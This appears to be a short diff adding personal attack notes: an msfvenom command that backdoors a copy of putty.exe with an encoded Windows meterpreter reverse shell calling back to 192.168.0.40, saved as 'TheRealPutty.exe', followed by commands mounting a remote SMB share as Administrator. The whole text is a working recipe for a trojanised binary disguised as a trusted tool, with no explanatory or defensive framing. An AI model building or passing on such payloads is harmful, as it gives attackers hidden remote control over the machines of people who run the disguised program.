@@ -1,0 +1,5 @@
+msfvenom -a x86 –-platform windows -x Documents/viri/putty.exe -k  -p windows/meterpreter/reverse_tcp lhost=192.168.0.40 lport=4446  -e x86/shikata_ga_nai -i 3 -b “\x00” -f exe > TheRealPutty.exe
+
+
+sudo mkdir /media/share
+sudo mount //192.168.100.60/Share /media/share -o username=Administrator 
